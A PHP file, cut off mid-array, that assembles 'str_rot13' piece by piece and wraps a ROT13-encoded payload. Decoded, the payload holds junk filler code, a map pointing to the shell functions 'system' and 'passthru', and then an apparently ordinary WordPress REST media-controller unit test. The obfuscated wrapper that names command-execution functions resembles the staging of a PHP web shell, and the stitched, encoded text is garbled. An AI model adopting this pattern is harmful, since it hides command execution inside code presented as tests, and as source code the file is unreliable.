<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Nggnpuzragf_Pbagebyyre shapgvbanyvgl
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Nggnpuzragf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Cbfg_Glcr_Pbagebyyre_Grfgpnfr {

	cebgrpgrq fgngvp $fhcrenqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $nhgube_vq;
	cebgrpgrq fgngvp $pbagevohgbe_vq;
	cebgrpgrq fgngvp $hcybnqre_vq;
	cebgrpgrq fgngvp $erfg_nsgre_vafreg_nggnpuzrag_pbhag;
	cebgrpgrq fgngvp $erfg_vafreg_nggnpuzrag_pbhag;

	/**
	 * @ine fgevat Gur cngu gb n grfg svyr.
	 */
	cevingr fgngvp $grfg_svyr;

	/**
	 * @ine fgevat Gur cngu gb n frpbaq grfg svyr.
	 */
	cevingr fgngvp $grfg_svyr2;

	/**
	 * @ine fgevat Gur cngu gb gur NIVS grfg vzntr.
	 */
	cevingr fgngvp $grfg_nivs_svyr;

	/**
	 * @ine fgevat Gur cngu gb gur FIT grfg vzntr.
	 */
	cevingr fgngvp $grfg_fit_svyr;

	/**
	 * @ine neenl Gur erpbeqrq cbfgf dhrel pynhfrf.
	 */
	cebgrpgrq $cbfgf_pynhfrf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhcrenqzva_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'fhcrenqzva',
			)
		);
		frys::$rqvgbe_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$nhgube_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);
		frys::$hcybnqre_vq    = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'hcybnqre',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( 'fhcrenqzva' ) );
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		vs ( svyr_rkvfgf( frys::$grfg_svyr ) ) {
			hayvax( frys::$grfg_svyr );
		}
		vs ( svyr_rkvfgf( frys::$grfg_svyr2 ) ) {
			hayvax( frys::$grfg_svyr2 );
		}
		vs ( svyr_rkvfgf( frys::$grfg_nivs_svyr ) ) {
			hayvax( frys::$grfg_nivs_svyr );
		}

		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		frys::qryrgr_hfre( frys::$nhgube_vq );
		frys::qryrgr_hfre( frys::$pbagevohgbe_vq );
		frys::qryrgr_hfre( frys::$hcybnqre_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Nqq na hcybnqre ebyr gb grfg hcybnq pncnovyvgvrf.
		nqq_ebyr( 'hcybnqre', 'Svyr hcybnq ebyr' );
		$ebyr = trg_ebyr( 'hcybnqre' );
		$ebyr->nqq_pnc( 'hcybnq_svyrf' );
		$ebyr->nqq_pnc( 'ernq' );
		$ebyr->nqq_pnc( 'yriry_0' );

		$bevt_svyr       = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		frys::$grfg_svyr = trg_grzc_qve() . 'pnabyn.wct';
		vs ( ! svyr_rkvfgf( frys::$grfg_svyr ) ) {
			pbcl( $bevt_svyr, frys::$grfg_svyr );
		}

		$bevt_svyr2       = QVE_GRFGQNGN . '/vzntrf/pbqrvfcbrgel.cat';
		frys::$grfg_svyr2 = trg_grzc_qve() . 'pbqrvfcbrgel.cat';
		vs ( ! svyr_rkvfgf( frys::$grfg_svyr2 ) ) {
			pbcl( $bevt_svyr2, frys::$grfg_svyr2 );
		}

		$bevt_nivs_svyr       = QVE_GRFGQNGN . '/vzntrf/nivs-ybffl.nivs';
		frys::$grfg_nivs_svyr = trg_grzc_qve() . 'nivs-ybffl.nivs';
		vs ( ! svyr_rkvfgf( frys::$grfg_nivs_svyr ) ) {
			pbcl( $bevt_nivs_svyr, frys::$grfg_nivs_svyr );
		}

		$grfg_fit_svyr       = QVE_GRFGQNGN . '/hcybnqf/ivqrb-cynl.fit';
		frys::$grfg_fit_svyr = trg_grzc_qve() . 'ivqrb-cynl.fit';
		vs ( ! svyr_rkvfgf( frys::$grfg_fit_svyr ) ) {
			pbcl( $grfg_fit_svyr, frys::$grfg_fit_svyr );
		}

		nqq_svygre( 'erfg_cer_qvfcngpu', neenl( $guvf, 'jcFrgHcOrsberErdhrfg' ), 10, 3 );
		nqq_svygre( 'cbfgf_pynhfrf', neenl( $guvf, 'fnir_cbfgf_pynhfrf' ), 10, 2 );
	}

	choyvp shapgvba jcFrgHcOrsberErdhrfg( $erfhyg ) {
		$guvf->cbfgf_pynhfrf = neenl();
		erghea $erfhyg;
	}

	choyvp shapgvba fnir_cbfgf_pynhfrf( $pynhfrf ) {
		$guvf->cbfgf_pynhfrf[] = $pynhfrf;
		erghea $pynhfrf;
	}

	choyvp shapgvba grne_qbja() {
		$guvf->erzbir_nqqrq_hcybnqf();

		vs ( pynff_rkvfgf( JC_Vzntr_Rqvgbe_Zbpx::pynff ) ) {
			JC_Vzntr_Rqvgbe_Zbpx::$fcl         = neenl();
			JC_Vzntr_Rqvgbe_Zbpx::$rqvg_erghea = neenl();
			JC_Vzntr_Rqvgbe_Zbpx::$fvmr_erghea = ahyy;
		}

		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrqvn', $ebhgrf );
		$guvf->nffregPbhag( 2, $ebhgrf['/jc/i2/zrqvn'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrqvn/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregPbhag( 3, $ebhgrf['/jc/i2/zrqvn/(?C<vq>[\q]+)'] );
	}

	/**
	 * @qngnCebivqre qngn_cnefr_qvfcbfvgvba
	 */
	choyvp shapgvba grfg_cnefr_qvfcbfvgvba( $urnqre, $rkcrpgrq ) {
		$urnqre_yvfg = neenl( $urnqre );
		$cnefrq      = JC_ERFG_Nggnpuzragf_Pbagebyyre::trg_svyranzr_sebz_qvfcbfvgvba( $urnqre_yvfg );
		$guvf->nffregFnzr( $rkcrpgrq, $cnefrq );
	}

	choyvp fgngvp shapgvba qngn_cnefr_qvfcbfvgvba() {
		erghea neenl(
			// Glcrf.
			neenl( 'nggnpuzrag; svyranzr=\"sbb.wct\"', 'sbb.wct' ),
			neenl( 'vayvar; svyranzr=\"sbb.wct\"', 'sbb.wct' ),
			neenl( 'sbez-qngn; svyranzr=\"sbb.wct\"', 'sbb.wct' ),

			// Sbeznggvat.
			neenl( 'nggnpuzrag; svyranzr=\"sbb.wct\"', 'sbb.wct' ),
			neenl( 'nggnpuzrag; svyranzr=sbb.wct', 'sbb.wct' ),
			neenl( 'nggnpuzrag;svyranzr=\"sbb.wct\"', 'sbb.wct' ),
			neenl( 'nggnpuzrag;svyranzr=sbb.wct', 'sbb.wct' ),
			neenl( 'nggnpuzrag; svyranzr = \"sbb.wct\"', 'sbb.wct' ),
			neenl( 'nggnpuzrag; svyranzr = sbb.wct', 'sbb.wct' ),
			neenl( \"nggnpuzrag;\gsvyranzr\g=\g\\"sbb.wct\\"\", 'sbb.wct' ),
			neenl( \"nggnpuzrag;\gsvyranzr\g=\gsbb.wct\", 'sbb.wct' ),
			neenl( 'nggnpuzrag; svyranzr = zl sbb cvpgher.wct', 'zl sbb cvpgher.wct' ),

			// Rkgrafvbaf.
			neenl( 'sbez-qngn; anzr=\"zlsvyr\"; svyranzr=\"sbb.wct\"', 'sbb.wct' ),
			neenl( 'sbez-qngn; anzr=\"zlsvyr\"; svyranzr=\"sbb.wct\"; fbzrguvat=\"ryfr\"', 'sbb.wct' ),
			neenl( 'sbez-qngn; anzr=zlsvyr; svyranzr=sbb.wct; fbzrguvat=ryfr', 'sbb.wct' ),
			neenl( 'sbez-qngn; anzr=zlsvyr; svyranzr=zl sbb.wct; fbzrguvat=ryfr', 'zl sbb.wct' ),

			// Vainyvq.
			neenl( 'svyranzr=\"sbb.wct\"', ahyy ),
			neenl( 'svyranzr-sbb.wct', ahyy ),
			neenl( 'sbb.wct', ahyy ),
			neenl( 'haxabja; abgsvyranzr=\"sbb.wct\"', ahyy ),
		);
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlAbgUnfXrl( 'nyybj_ongpu', $qngn['raqcbvagf'][0] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erfcbafr      = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn          = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlAbgUnfXrl( 'nyybj_ongpu', $qngn['raqcbvagf'][0] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'nsgre',
				'nhgube',
				'nhgube_rkpyhqr',
				'orsber',
				'pbagrkg',
				'rkpyhqr',
				'vapyhqr',
				'zrqvn_glcr',
				'zvzr_glcr',
				'zbqvsvrq_nsgre',
				'zbqvsvrq_orsber',
				'bssfrg',
				'beqre',
				'beqreol',
				'cntr',
				'cnerag',
				'cnerag_rkpyhqr',
				'cre_cntr',
				'frnepu',
				'frnepu_pbyhzaf',
				'frnepu_frznagvpf',
				'fyht',
				'fgnghf',
			),
			$xrlf
		);
		$zrqvn_glcrf = neenl(
			'nccyvpngvba',
			'ivqrb',
			'vzntr',
			'nhqvb',
			'grkg',
		);
		$guvf->nffregFnzrFrgf( $zrqvn_glcrf, $qngn['raqcbvagf'][0]['netf']['zrqvn_glcr']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_trg_vgrz_cnenzf() {
		$vq1      = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/zrqvn/%q', $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		$guvf->nffregRdhnyFrgf( neenl( 'pbagrkg', 'vq' ), $xrlf );
	}

	/**
	 * @gvpxrg 43701
	 */
	choyvp shapgvba grfg_nyybj_urnqre_frag_ba_bcgvbaf_erdhrfg() {
		$vq1      = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/zrqvn/%q', $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, erfg_trg_freire(), $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();

		$guvf->nffregAbgRzcgl( $urnqref['Nyybj'] );
		$guvf->nffregFnzr( $urnqref['Nyybj'], 'TRG' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/zrqvn/%q', $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, erfg_trg_freire(), $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();

		$guvf->nffregAbgRzcgl( $urnqref['Nyybj'] );
		$guvf->nffregFnzr( $urnqref['Nyybj'], 'TRG, CBFG, CHG, CNGPU, QRYRGR' );
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( 0 );
		$vq1            = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$qensg_cbfg     = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );
		$vq2            = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$qensg_cbfg,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$choyvfurq_cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3            = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$choyvfurq_cbfg,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erfcbafr       = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn           = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$vqf = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );
		$guvf->nffregPbagnvaf( $vq3, $vqf );

		$guvf->purpx_trg_cbfgf_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_trg_vgrzf_ybttrq_va_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$vq1            = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$qensg_cbfg     = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );
		$vq2            = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$qensg_cbfg,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$choyvfurq_cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3            = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$choyvfurq_cbfg,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erfcbafr       = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 3, $qngn );
		$vqf = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );
		$guvf->nffregPbagnvaf( $vq3, $vqf );
	}

	choyvp shapgvba grfg_trg_vgrzf_zrqvn_glcr() {
		$vq1      = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
		// 'zrqvn_glcr' => 'ivqrb'.
		$erdhrfg->frg_cnenz( 'zrqvn_glcr', 'ivqrb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
		// 'zrqvn_glcr' => 'vzntr'.
		$erdhrfg->frg_cnenz( 'zrqvn_glcr', 'vzntr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_zvzr_glcr() {
		$vq1      = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
		// 'zvzr_glcr' => 'vzntr/cat'.
		$erdhrfg->frg_cnenz( 'zvzr_glcr', 'vzntr/cat' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
		// 'zvzr_glcr' => 'vzntr/wcrt'.
		$erdhrfg->frg_cnenz( 'zvzr_glcr', 'vzntr/wcrt' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_cnerag() {
		$cbfg_vq        = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Grfg Cbfg' ) );
		$nggnpuzrag_vq  = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$nggnpuzrag_vq2 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		// Nyy nggnpuzragf.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		// Nggnpuzragf jvgubhg n cnerag.
		$erdhrfg->frg_cnenz( 'cnerag', 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $nggnpuzrag_vq2, $qngn[0]['vq'] );
		// Nggnpuzragf jvgu cnerag=cbfg_vq.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'cnerag', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $nggnpuzrag_vq, $qngn[0]['vq'] );
		// Nggnpuzragf jvgu vainyvq cnerag.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'cnerag', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 0, $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_fgnghf_cnenz_vf_reebe_erfcbafr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'choyvfu' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr );
	}

	choyvp shapgvba grfg_trg_vgrzf_cevingr_fgnghf() {
		// Ybttrq bhg hfref pna'g znxr gur erdhrfg.
		jc_frg_pheerag_hfre( 0 );
		$nggnpuzrag_vq1 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_fgnghf'    => 'cevingr',
			)
		);
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'cevingr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
		// Cebcreyl nhgubevmrq hfref pna znxr gur erdhrfg.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $nggnpuzrag_vq1, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fgnghfrf() {
		// Ybttrq bhg hfref pna'g znxr gur erdhrfg.
		jc_frg_pheerag_hfre( 0 );
		$nggnpuzrag_vq1 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_fgnghf'    => 'cevingr',
			)
		);
		$nggnpuzrag_vq2 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_fgnghf'    => 'genfu',
			)
		);
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'cevingr', 'genfu' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
		// Cebcreyl nhgubevmrq hfref pna znxr gur erdhrfg.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$vqf = neenl(
			$qngn[0]['vq'],
			$qngn[1]['vq'],
		);
		fbeg( $vqf );
		$guvf->nffregFnzr( neenl( $nggnpuzrag_vq1, $nggnpuzrag_vq2 ), $vqf );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_qngr() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'nsgre', 'sbb' );
		$erdhrfg->frg_cnenz( 'orsber', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_inyvq_qngr() {
		$vq1     = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_qngr'      => '2016-01-15G00:00:00M',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$vq2     = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_qngr'      => '2016-01-16G00:00:00M',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$vq3     = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_qngr'      => '2016-01-17G00:00:00M',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'nsgre', '2016-01-15G00:00:00M' );
		$erdhrfg->frg_cnenz( 'orsber', '2016-01-17G00:00:00M' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 50617
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_zbqvsvrq_qngr() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_nsgre', 'sbb' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_orsber', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 50617
	 */
	choyvp shapgvba grfg_trg_vgrzf_inyvq_zbqvsvrq_qngr() {
		$vq1 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_qngr'      => '2016-01-01 00:00:00',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$vq2 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_qngr'      => '2016-01-02 00:00:00',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$vq3 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
